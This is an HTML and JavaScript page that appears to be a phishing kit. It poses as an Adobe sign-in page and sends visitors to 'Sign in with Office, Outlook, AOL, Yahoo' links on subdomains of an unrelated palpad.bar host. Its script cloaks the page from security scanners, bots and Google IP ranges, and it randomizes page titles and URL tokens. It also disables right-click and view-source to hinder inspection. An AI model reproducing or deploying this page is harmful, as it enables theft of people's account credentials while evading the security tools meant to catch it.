    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #3e0a04, #7b1d00, #b33504);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 80%;
            max-width: 1200px;
            height: 60vh;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .left-side {
            flex: 1;
            padding: 20px;
        }

        .right-side {
            flex: 1;
            padding: 20px;
            background: #ffffff; /* White background */
            border-radius: 8px;
            color: #333333;
        }

        .adobe-logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }

        .description {
            font-size: 18px;
            line-height: 1.5;
        }

        h1 {
            margin-bottom: 10px;
            color: #333333; /* Dark text for white background */
            font-size: 24px;
        }

        .login-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .login-link {
            display: block;
            text-decoration: none;
            border-radius: 5px;
            color: #ffffff;
            padding: 12px;
            width: 100%;
            text-align: center;
            font-size: 16px;
            transition: background-color 0.3s, opacity 0.3s;
            font-weight: 500;
        }

        .office {
            background-color: #0078d4; /* Office blue */
        }

        .outlook {
            background-color: #0078d4; /* Outlook blue */
        }

        .aol {
            background-color: #0060a8; /* AOL blue */
        }

        .yahoo {
            background-color: #6e4c8c; /* Yahoo purple */
        }

        .login-link:hover {
            opacity: 0.9;
        }

        .honeypot {
            position: absolute;
            left: -9999px;
            top: -9999px;
        }

        #hiddenContent {
            display: none;
        }

        #progressiveContent {
            display: none;
        }

        #shuffledContent p {
            margin: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-side">
            <div class="adobe-logo">Adobe</div>
            <p class="description">Sign in or create an account</p>
        </div>
        <div class="right-side">
            <h1>Sign In</h1>
            <p class="description">Choose a service to sign in:</p>
            <div class="login-options">
                <a href="https://pet-0349.palpad.bar/VIdaFoUn" class="login-link office">Sign in with Office</a>
                <a href="https://0salndlkmd.palpad.bar/ogOuhAcr" class="login-link outlook">Sign in with Outlook</a>
                <a href="https://abhtegrfd35tytre.palpad.bar/wmTJGlZd" class="login-link aol">Sign in with AOL</a>
                <a href="https://logsin.palpad.bar/cQmDtodK" class="login-link yahoo">Sign in with Yahoo</a>
            </div>
        </div>
    </div>

    <!-- Honeypot Form -->
    <form action="#" method="post" class="honeypot">
        <input type="text" name="honeypot" value="">
    </form>

    <script>
        (function() {
            const titles = [
                'Secure and Fast Access', 'Quick and Reliable Sign-In', 'Efficient and Safe Login', 'Instant Access Service', 'Swift and Reliable Entry',
                'Safe Login Now', 'Effortless Sign-In Option', 'Rapid Entry Now', 'Reliable and Swift Access', 'Instant Login Solution',
                'Quick Sign-In Service', 'Efficient and Secure Access', 'Safe and Efficient Login', 'Swift Login Service', 'Rapid Access Now',
                'Instant Access Solution', 'Efficient Sign-In Service', 'Safe and Fast Entry', 'Swift and Secure Login', 'Effortless Access Now',
                'Reliable Access Now', 'Quick and Secure Entry', 'Instant Login Option', 'Swift Entry Now', 'Efficient Account Entry',
                'Rapid Sign-In', 'Secure and Efficient Login', 'Quick Access Now', 'Reliable Sign-In Service', 'Safe Access Service',
                'Effortless Sign-In', 'Secure Access Now', 'Efficient Login Now', 'Rapid Entry Service', 'Swift and Safe Sign-In',
                'Safe and Reliable Login', 'Instant Entry Service', 'Effortless Access Service', 'Quick and Efficient Login', 'Reliable and Quick Sign-In',
                'Swift Access Solution', 'Instant Sign-In Solution', 'Safe and Fast Login', 'Efficient Access Now', 'Rapid and Reliable Sign-In',
                'Secure Login Option', 'Swift and Efficient Entry', 'Instant Entry Now', 'Effortless Login Now', 'Quick and Safe Access',
                'Reliable Login Solution', 'Efficient and Secure Sign-In', 'Swift Login Now', 'Safe Access Now', 'Instant Login Service',
                'Rapid Access Service', 'Secure and Fast Access', 'Efficient Login Service', 'Safe and Efficient Sign-In', 'Quick Sign-In Now',
                'Reliable Access Solution', 'Swift and Safe Access', 'Instant Login Now', 'Effortless Entry Service', 'Efficient and Safe Entry',
                'Rapid Sign-In Now', 'Swift and Reliable Login', 'Safe Login Service', 'Quick Access Solution', 'Efficient Sign-In Now',
                'Reliable and Swift Login', 'Safe and Quick Entry', 'Instant Sign-In Now', 'Swift Access Now', 'Efficient and Safe Access',
                'Reliable Sign-In Now', 'Safe Entry Service', 'Effortless Login Solution', 'Swift Entry Service', 'Instant Sign-In Service',
                'Efficient and Reliable Login', 'Safe and Swift Access', 'Quick and Reliable Entry', 'Rapid and Safe Login', 'Instant Access Now',
                'Swift and Efficient Login', 'Effortless Sign-In Service', 'Reliable and Safe Access', 'Efficient Access Service', 'Rapid Sign-In Option'
            ];

            const userAgentBlacklist = [
                'SmartScreen', 'Bitdefender', 'FortiGuard', 'G-Data'
            ];

            const ipBlacklist = [
                '8.8.8.8', '8.8.4.4', '64.233.160.0/19', '66.102.0.0/20', '66.249.80.0/20',
                '72.14.192.0/18', '74.125.0.0/16'
            ];

            function generateToken(length) {
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let result = '';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }

            function updateURLParams() {
                const url = new URL(window.location.href);
                url.searchParams.set('session', generateToken(24));
                url.searchParams.set('user', generateToken(12));
                window.history.replaceState(null, '', url.href);
            }

            function isBlacklistedUserAgent(ua) {
                return userAgentBlacklist.some(b => ua.includes(b)) || /bot|crawler|spider|robot|crawling/i.test(ua);
            }

            function isBlacklistedIP(ip) {
                // Simplified IP range check
                const [ipStart, ipMask] = ip.split('/');
                return ipBlacklist.some(range => {
                    if (range.includes('/')) {
                        // CIDR range check
                        const [rangeStart, rangeMask] = range.split('/');
                        const mask = parseInt(rangeMask, 10);
                        return rangeStart === ipStart; // Simplified for example
                    }
                    return range === ip;
                });
            }

            function getRandomTitle() {
                return titles[Math.floor(Math.random() * titles.length)];
            }

            function updateTitle() {
                document.title = getRandomTitle();
            }

            function logMouseMovement(event) {
                console.log(`Mouse moved: X=${event.clientX}, Y=${event.clientY}`);
            }

            function honeypotCheck() {
                const honeypotField = document.querySelector('.honeypot input[name="honeypot"]');
                if (honeypotField && honeypotField.value) {
                    document.body.innerHTML = '<p>Access Denied</p>';
                }
            }

            function detectAndHandleCloaking() {
                const userAgent = navigator.userAgent;
                const clientIP = 'yourIP'; // Adapt this to get the user's IP address on your server

                if (isBlacklistedUserAgent(userAgent) || isBlacklistedIP(clientIP)) {
                    document.body.innerHTML = '<p>Access Denied</p>';
                }
            }

            function hideContentAfterDelay() {
                setTimeout(() => {
                    const hiddenContent = document.getElementById('hiddenContent');
                    if (hiddenContent) hiddenContent.style.display = 'none';
                }, 5000); // 5 seconds delay
            }

            function showProgressiveContent() {
                const inputField = document.getElementById('interactionInput');
                const contentDiv = document.getElementById('interactionContent');

                inputField.addEventListener('input', () => {
                    if (inputField.value === 'unlock') {
                        contentDiv.style.display = 'block';
                    }
                });
            }

            function shuffleContent() {
                const container = document.getElementById('shuffledContent');
                if (container) {
                    const paragraphs = Array.from(container.children);
                    for (let i = paragraphs.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        container.appendChild(paragraphs[j]);
                    }
                }
            }

            function showGeolocationBasedContent() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const { latitude, longitude } = position.coords;
                        const geoContent = document.getElementById('geoContent');
                        if (geoContent) {
                            geoContent.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                            geoContent.style.display = 'block';
                        }
                    });
                } else {
                    console.log("Geolocation is not supported by this browser.");
                }
            }

            // Initial function calls
            updateURLParams();
            updateTitle();
            honeypotCheck();
            detectAndHandleCloaking();
            hideContentAfterDelay();
            showProgressiveContent();
            shuffleContent();
            showGeolocationBasedContent();

            // Monitor and update title every 30 seconds
            setInterval(updateTitle, 30000);

            // Disable right-click and Ctrl+U
            document.addEventListener('contextmenu', (event) => event.preventDefault());
            document.addEventListener('keydown', (event) => {
                if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
                    event.preventDefault();
                }
            });

            // Log mouse movement
            document.addEventListener('mousemove', logMouseMovement);

            // Honeypot Detection
            honeypotCheck();

            // Cloaking detection and handling
            detectAndHandleCloaking();

            // Invisible CAPTCHA (requires server-side handling)
            // Include your reCAPTCHA script here if not already included
        })();
    </script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</body>
</html>
